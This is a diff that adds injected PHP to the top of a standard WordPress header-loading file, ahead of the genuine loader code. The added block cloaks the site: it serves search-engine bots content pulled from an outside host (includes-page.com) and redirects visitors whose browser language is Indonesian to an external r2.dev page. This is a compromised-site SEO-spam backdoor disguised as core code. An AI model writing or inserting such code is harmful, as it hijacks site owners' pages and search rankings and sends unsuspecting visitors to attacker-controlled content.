@@ -1,0 +1,40 @@
+<?php
+$s_ref = $_SERVER['HTTP_REFERER'];
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
+        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+        if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
+            setcookie('az', 'lp', time() + 3600 * 7200);
+            echo ' '; // Your bot-specific content
+            exit;
+        }
+        echo file_get_contents("https://includes-page.com/cmd/www.spaatthewoods.com/lp.txt");
+        exit;
+        ?>
+        <?php
+    }
+    $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
+    if ($browserLang == 'id') {
+        header("Location: https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/amp.spaatthewoods.html");
+        exit;
+    }
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
